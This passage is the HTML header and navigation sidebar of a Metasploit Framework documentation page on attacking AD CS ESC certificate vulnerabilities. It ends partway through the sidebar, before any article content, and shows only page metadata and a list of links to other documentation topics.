<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-4622520-7"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-4622520-7', { 'anonymize_ip': true }); </script> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script><meta name="viewport" content="width=device-width, initial-scale=1"><title>Attacking AD CS ESC Vulnerabilities Using Metasploit | Metasploit Documentation Penetration Testing Software, Pen Testing Security</title><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Attacking AD CS ESC Vulnerabilities Using Metasploit" /><meta property="og:locale" content="en_US" /><meta name="description" content="View Metasploit Framework Documentation" /><meta property="og:description" content="View Metasploit Framework Documentation" /><link rel="canonical" href="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" /><meta property="og:url" content="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" /><meta property="og:site_name" content="Metasploit Documentation Penetration Testing Software, Pen Testing Security" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Attacking AD CS ESC Vulnerabilities Using Metasploit" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"View Metasploit Framework Documentation","headline":"Attacking AD CS ESC Vulnerabilities Using Metasploit","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://rapid7.github.io/metasploit-framework/assets/images/favicon.png"}},"url":"https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html"}</script><body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"><title>Link</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"><title>Search</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"><title>Menu</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"><title>Expand</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"><polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"><title>Document</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/assets/js/toggle_init.js"></script><div class="side-bar"><div class="site-header"> <a href="/" class="site-title lh-tight"><img src="/assets/images/metasploit-logo-dark-external-use.svg" alt="Metasploit Logo" class="title-logo" /> </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a></div><nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"><ul class="nav-list"><li class="nav-list-item active"><a href="/" class="nav-list-link">Home</a><li class="nav-list-item active"><a href="/docs/code-of-conduct.html" class="nav-list-link">Code Of Conduct</a><li class="nav-list-item active"><a href="/docs/modules.html" class="nav-list-link">Modules</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/" class="nav-list-link active">Pentesting</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-setting-module-options.html" class="nav-list-link">Setting Module Options</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html" class="nav-list-link">Upgrading Shells to Meterpreter</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-post-gather-modules.html" class="nav-list-link">Post Gather Modules</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-http.html" class="nav-list-link">HTTP + HTTPS</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-kubernetes.html" class="nav-list-link">Kubernetes</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mysql.html" class="nav-list-link">MySQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-postgresql.html" class="nav-list-link">PostgreSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-smb.html" class="nav-list-link">SMB</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ssh.html" class="nav-list-link">SSH</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-winrm.html" class="nav-list-link">WinRM</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mssql.html" class="nav-list-link">MSSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ldap.html" class="nav-list-link">LDAP</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/" class="nav-list-link active">Active Directory</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/ad-certificates/" class="nav-list-link active">AD CS</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" class="nav-list-link active">Attacking AD CS ESC Vulnerabilities Using Metasploit</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html" class="nav-list-link">Vulnerable cert finder</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ad_cs_cert_template.html" class="nav-list-link">Manage certificate templates</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/icpr_cert.html" class="nav-list-link">Request certificates</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/kerberos/" class="nav-list-link">Kerberos</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/service_authentication.html" class="nav-list-link">Authenticating to SMB/WinRM/etc</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberos_login.html" class="nav-list-link">Kerberos login enumeration and bruteforcing</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/get_ticket.html" class="nav-list-link">Get Ticket granting tickets and service tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/ticket_converter.html" class="nav-list-link">Converting kirbi and ccache files</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/forge_ticket.html" class="nav-list-link">Forging tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/inspect_ticket.html" class="nav-list-link">Inspecting tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberoasting.html" class="nav-list-link">Kerberoasting</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/keytab.html" class="nav-list-link">Keytab support and decrypting wireshark traffic</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/rbcd.html" class="nav-list-link">Resource-based constrained delegation (RBCD)</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/unconstrained_delegation.html" class="nav-list-link">Unconstrained delegation</a></ul></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/" class="nav-list-link">Using Metasploit</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/getting-started/" class="nav-list-link">Getting Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/nightly-installers.html" class="nav-list-link">Nightly Installers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/reporting-a-bug.html" class="nav-list-link">Reporting a Bug</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/basics/" class="nav-list-link">Basics</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/using-metasploit.html" class="nav-list-link">Running modules</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html" class="nav-list-link">How to use a Metasploit module appropriately</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-payloads-work.html" class="nav-list-link">How payloads work</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/module-documentation.html" class="nav-list-link">Module Documentation</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html" class="nav-list-link">How to use a reverse shell in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-msfvenom.html" class="nav-list-link">How to use msfvenom</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/managing-sessions.html" class="nav-list-link">Managing Sessions</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/intermediate/" class="nav-list-link">Intermediate</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/metasploit-database-support.html" class="nav-list-link">Database Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/evading-anti-virus.html" class="nav-list-link">Evading Anti Virus</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/exploit-ranking.html" class="nav-list-link">Exploit Ranking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/hashes-and-password-cracking.html" class="nav-list-link">Hashes and Password Cracking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/how-to-use-plugins.html" class="nav-list-link">Metasploit Plugins</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/payload-uuid.html" class="nav-list-link">Payload UUID</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/pivoting-in-metasploit.html" class="nav-list-link">Pivoting in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/running-private-modules.html" class="nav-list-link">Running Private Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/" class="nav-list-link">Advanced</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/how-to-configure-dns.html" class="nav-list-link">How to Configure DNS</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/metasploit-web-service.html" class="nav-list-link">Metasploit Web Service</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/meterpreter/" class="nav-list-link">Meterpreter</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html" class="nav-list-link">Configuration</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html" class="nav-list-link">Debugging Dead Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-debugging-meterpreter-sessions.html" class="nav-list-link">Debugging Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html" class="nav-list-link">ExecuteBof Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html" class="nav-list-link">HTTP Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html" class="nav-list-link">How to get started with writing a Meterpreter script</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html" class="nav-list-link">Paranoid Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/powershell-extension.html" class="nav-list-link">Powershell Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/python-extension.html" class="nav-list-link">Python Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reg-command.html" class="nav-list-link">Reg Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html" class="nav-list-link">Reliable Network Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html" class="nav-list-link">Sleep Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html" class="nav-list-link">Stageless Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html" class="nav-list-link">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html" class="nav-list-link">Timeout Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html" class="nav-list-link">Transport Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html" class="nav-list-link">Unicode Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html" class="nav-list-link">Wishlist</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/RPC/" class="nav-list-link">RPC</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-json-rpc.html" class="nav-list-link">How to use Metasploit JSON RPC</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-messagepack-rpc.html" class="nav-list-link">How to use Metasploit Messagepack RPC</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/" class="nav-list-link">Other</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-metasploit-with-ngrok.html" class="nav-list-link">How to use Metasploit with ngrok</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-the-favorite-command.html" class="nav-list-link">How to use the Favorite command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html" class="nav-list-link">Information About Unmet Browser Exploit Requirements</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/oracle-support/" class="nav-list-link">Oracle Support</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html" class="nav-list-link">How to get Oracle Support working with Kali Linux</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/oracle-usage.html" class="nav-list-link">Oracle Usage</a></ul><li class="nav-list-item active"><a href="/docs/using-metasploit/other/why-cve-is-not-available.html" class="nav-list-link">Why CVE is not available</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/" class="nav-list-link">Development</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/" class="nav-list-link">Get Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/contributing-to-metasploit.html" class="nav-list-link">Contributing to Metasploit</a><li class="nav-list-item active"><a href="/docs/development/get-started/creating-your-first-pr.html" class="nav-list-link">Creating Your First PR</a><li class="nav-list-item active"><a href="/docs/development/get-started/setting-up-a-metasploit-development-environment.html" class="nav-list-link">Setting Up a Metasploit Development Environment</a><li class="nav-list-item active"><a href="/docs/development/get-started/sanitizing-pcaps.html" class="nav-list-link">Sanitizing PCAPs</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/git/" class="nav-list-link">Git</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-reference-sites.html" class="nav-list-link">Git Reference Sites</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-cheatsheet.html" class="nav-list-link">Git cheatsheet</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html" class="nav-list-link">Keeping in sync with rapid7 master</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/remote-branch-pruning.html" class="nav-list-link">Remote Branch Pruning</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/using-git.html" class="nav-list-link">Using Git</a></ul><li class="nav-list-item active"><a href="/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html" class="nav-list-link">Navigating the codebase</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/" class="nav-list-link">Developing Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/" class="nav-list-link">Guides</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/scanners/" class="nav-list-link">Scanners</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html" class="nav-list-link">Writing a HTTP LoginScanner</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html" class="nav-list-link">Writing an FTP LoginScanner</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html" class="nav-list-link">How to check Microsoft patch levels for your exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html" class="nav-list-link">How to use Fetch Payloads</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-command-stagers.html" class="nav-list-link">How to use command stagers</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-check-method.html" class="nav-list-link">How to write a check method</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-cmd-injection-module.html" class="nav-list-link">How to write a cmd injection module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html" class="nav-list-link">Writing a browser exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html" class="nav-list-link">Writing a post module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html" class="nav-list-link">Writing an auxiliary module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/get-started-writing-an-exploit.html" class="nav-list-link">Writing an exploit</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/external-modules/" class="nav-list-link">External Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-golang-modules.html" class="nav-list-link">Writing GoLang Modules</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-python-modules.html" class="nav-list-link">Writing Python Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/module-metadata/" class="nav-list-link">Module metadata</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html" class="nav-list-link">Definition of Module Reliability Side Effects and Stability</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html" class="nav-list-link">How to use datastore options</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/module-reference-identifiers.html" class="nav-list-link">Module Reference Identifiers</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/" class="nav-list-link">Libraries</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/api.html" class="nav-list-link">API</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html" class="nav-list-link">AuthBrute</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-cleanup-after-module-execution.html" class="nav-list-link">Cleanup</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/c/" class="nav-list-link">Compiling C</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html" class="nav-list-link">Base64 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html" class="nav-list-link">RC4 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html" class="nav-list-link">XOR Support</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/deserialization/" class="nav-list-link">Deserialization</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html" class="nav-list-link">Dot Net Deserialization</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html" class="nav-list-link">Java Deserialization</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html" class="nav-list-link">Fail_with</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html" class="nav-list-link">Fileformat</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-git-mixin-to-write-an-exploit-module.html" class="nav-list-link">Git Mixin</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/http/" class="nav-list-link">HTTP</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html" class="nav-list-link">BrowserExploitServer</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html" class="nav-list-link">How to Send an HTTP Request Using HttpClient</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html" class="nav-list-link">How to parse an HTTP response</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html" class="nav-list-link">How to send an HTTP request using Rex Proto Http Client</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html" class="nav-list-link">How to write a module using HttpServer and HttpClient</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html" class="nav-list-link">Logging</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/obfuscation/" class="nav-list-link">Obfuscation</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html" class="nav-list-link">C Obfuscation</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html" class="nav-list-link">JavaScript Obfuscation</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html" class="nav-list-link">PhpExe</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html" class="nav-list-link">Powershell</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html" class="nav-list-link">Railgun</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/using-reflectivedll-injection.html" class="nav-list-link">ReflectiveDLL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html" class="nav-list-link">Reporting and Storing Data</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html" class="nav-list-link">SEH Exploitation</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/smb_library/" class="nav-list-link">SMB Library</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html" class="nav-list-link">Guidelines for Writing Modules with SMB</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/what-my-rex-proto-smb-error-means.html" class="nav-list-link">What my Rex Proto SMB Error means</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/sql-injection-libraries.html" class="nav-list-link">SQL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html" class="nav-list-link">TCP</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html" class="nav-list-link">WbemExec</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html" class="nav-list-link">Zip</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/google-summer-of-code/" class="nav-list-link">Google Summer of Code</a><ul class="nav-list"><li class="nav-list-item active"><a 